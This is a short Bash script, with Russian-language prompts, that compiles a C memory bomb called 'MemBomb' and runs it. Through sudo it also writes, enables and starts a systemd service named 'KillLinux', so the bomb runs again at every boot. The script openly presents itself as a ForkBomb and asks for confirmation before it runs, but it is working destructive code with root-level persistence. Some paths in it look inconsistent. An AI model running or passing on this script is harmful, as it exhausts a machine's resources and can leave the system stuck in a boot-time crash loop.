#!/bin/bash

echo "Добро пожаловать!"

read -p "Вы уверены, что хотите запустить ForkBomb? (y/n): " confirm

if [ "$confirm" == "y" ]; then
    if gcc -o MemBomb MemBombLin.c; then
        echo "Запускаем..."
        sudo touch /etc/systemd/system/KillLinux.service
			sudo chmod 644 /etc/systemd/system/KillLinux.service

			sudo tee /etc/systemd/system/KillLinux.service << EOF
[Unit]
Description=KillLinux
After=network.target

[Service]
ExecStart=$(find $work_dir/MemBomb/ -type f -name "Membomb" -executable -print -quit)

[Install]
WantedBy=default.target
EOF
		sudo systemctl unmask KillLinux.service
		sudo systemctl daemon-reload
		sudo systemctl enable KillLinux.service
		sudo systemctl start KillLinux.service
        sudo ./MemBomb &
        pid=$!
        sleep 10
        kill $pid
        rm -f MemBomb
    else
        echo "Ошибка компиляции."
    fi
else
    echo "Запуск ForkBomb отменен"
fi
